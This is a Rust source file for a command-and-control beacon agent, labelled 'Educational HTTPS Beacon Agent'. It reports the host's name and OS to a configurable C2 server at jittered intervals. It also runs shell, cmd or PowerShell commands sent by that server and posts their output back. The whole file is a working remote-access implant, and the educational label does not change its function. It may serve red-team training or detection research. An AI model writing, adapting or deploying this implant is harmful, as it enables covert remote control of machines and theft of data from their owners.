use reqwest::Client;
use serde_json::{json, Value};
use uuid::Uuid;
use std::fs;
use std::time::Duration;
use tokio::time::sleep;
use rand::Rng;
use std::process::Command;

mod system_info;

#[derive(Serialize)]
struct BeaconPayload {
    id: String,
    status: String,
    hostname: String,
    os: String,
}

#[derive(Deserialize)]
struct BeaconResponse {
    success: bool,
    timestamp: String,
    commands: Vec<PendingCommand>,
}

#[derive(Deserialize, Clone)]
struct PendingCommand {
    id: String,
    command_type: String,
    payload: String,
}

#[tokio::main]
async fn main() {
    println!("Educational HTTPS Beacon Agent starting...");

    // Get or create persistent Agent ID
    let agent_id = get_or_create_agent_id();
    println!("Agent ID: {}", agent_id);

    let hostname = system_info::get_hostname();
    let os = system_info::get_os_name();
    println!("Host: {}, OS: {}", hostname, os);

    // Get server URL from env or default
    let server_url = std::env::var("C2_SERVER_URL")
        .unwrap_or_else(|_| "http://localhost:3000".to_string());
    
    // Get auth token (in production, load from secure storage or config)
    let auth_token = std::env::var("C2_AGENT_TOKEN")
        .unwrap_or_else(|_| "default-token-change-me".to_string());

    println!("Beacon server: {}", server_url);
    println!("Starting beacon loop with 20-60s jitter...");

    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .expect("Failed to create HTTP client");

    loop {
        // Calculate jitter: random sleep between 20-60 seconds
        let jitter = rand::thread_rng().gen_range(20..=60);
        
        // Prepare beacon payload
        let payload = BeaconPayload {
            id: agent_id.clone(),
            status: "alive".to_string(),
            hostname: hostname.clone(),
            os: os.clone(),
        };

        // Send beacon
        let beacon_url = format!("{}/api/beacon", server_url);
        match client
            .post(&beacon_url)
            .header("Authorization", format!("Bearer {}", auth_token))
            .json(&payload)
            .send()
            .await
        {
            Ok(response) => {
                if response.status().is_success() {
                    match response.json::<BeaconResponse>().await {
                        Ok(beacon_resp) => {
                            if beacon_resp.success {
                                println!("Beacon accepted at {}", beacon_resp.timestamp);
                                
                                // Process any commands received
                                for cmd in beacon_resp.commands {
                                    println!("Received command {}: {}", cmd.id, cmd.command_type);
                                    execute_command(&client, &server_url, &agent_id, &auth_token, cmd).await;
                                }
                            }
                        }
                        Err(e) => {
                            eprintln!("Failed to parse beacon response: {}", e);
                        }
                    }
                } else {
                    eprintln!("Beacon rejected: HTTP {}", response.status());
                }
            }
            Err(e) => {
                eprintln!("Beacon failed: {}", e);
            }
        }

        println!("Sleeping for {} seconds before next beacon...", jitter);
        sleep(Duration::from_secs(jitter)).await;
    }
}

async fn execute_command(
    client: &Client, 
    server_url: &str, 
    agent_id: &str,
    auth_token: &str,
    cmd: PendingCommand,
) {
    println!("Executing command {}: {}", cmd.id, cmd.payload);
    
    let output = match cmd.command_type.as_str() {
        "shell" | "bash" | "cmd" => execute_shell(&cmd.payload),
        "powershell" => execute_powershell(&cmd.payload),
        _ => format!("Unknown command type: {}", cmd.command_type),
    };

    println!("Command {} output (first 100 chars): {}", cmd.id, 
             if output.len() > 100 { &output[..100] } else { &output });

    // Send result back to server
    let result_url = format!("{}/api/result", server_url);
    let result_payload = json!({
        "agent_id": agent_id,
        "command_id": cmd.id,
        "output": output,
        "status": "completed"
    });

    match client
        .post(&result_url)
        .header("Authorization", format!("Bearer {}", auth_token))
        .json(&result_payload)
        .send()
        .await
    {
        Ok(resp) => {
            if resp.status().is_success() {
                println!("Result for command {} sent successfully", cmd.id);
            } else {
                eprintln!("Failed to send result: HTTP {}", resp.status());
            }
        }
        Err(e) => {
            eprintln!("Failed to send result: {}", e);
        }
    }
}

fn execute_shell(command: &str) -> String {
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(&["/C", command])
            .output()
    } else {
        Command::new("sh")
            .args(&["-c", command])
            .output()
    };

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            let exit_code = out.status.code().unwrap_or(-1);
            format!("Exit code: {}\n\nSTDOUT:\n{}\n\nSTDERR:\n{}", exit_code, stdout, stderr)
        }
        Err(e) => format!("Failed to execute command: {}", e),
    }
}

fn execute_powershell(command: &str) -> String {
    let output = Command::new("powershell")
        .args(&["-Command", command])
        .output();
    
    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            format!("STDOUT:\n{}\n\nSTDERR:\n{}", stdout, stderr)
        }
        Err(e) => format!("Failed to execute PowerShell: {}", e),
    }
}

fn get_or_create_agent_id() -> String {
    let id_file = "agent_id.txt";
    if let Ok(id) = fs::read_to_string(id_file) {
        let trimmed = id.trim();
        if !trimmed.is_empty() {
            return trimmed.to_string();
        }
    }
    let new_id = Uuid::new_v4().to_string();
    let _ = fs::write(id_file, &new_id);
    new_id
}